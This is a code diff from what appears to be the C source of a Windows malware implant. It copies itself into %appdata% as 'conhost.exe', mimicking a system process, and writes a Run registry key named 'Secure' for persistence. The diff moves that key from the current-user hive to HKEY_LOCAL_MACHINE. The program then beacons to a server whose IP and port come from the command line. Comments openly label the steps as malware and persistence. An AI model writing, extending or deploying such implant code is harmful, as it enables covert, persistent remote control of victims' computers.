@@ -129,7 +129,7 @@ int main(int argc, char *argv[]) {
         int PORT = atoi(argv[2]);
         //printf("asasasasasa");
         system("cmd /c copy .\\conhost.exe %appdata%");  // copy malware to appdata
-        system("cmd /c REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V \"Secure\" /t REG_SZ /F /D \"%appdata%\\conhost.exe"); //add registry persistence 
+        system("cmd /c REG ADD HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V \"Secure\" /t REG_SZ /F /D \"%appdata%\\conhost.exe"); //add registry persistence 
         beacon_connect_to_server(IP, PORT);
     }
     else if( argc > 3 ) {
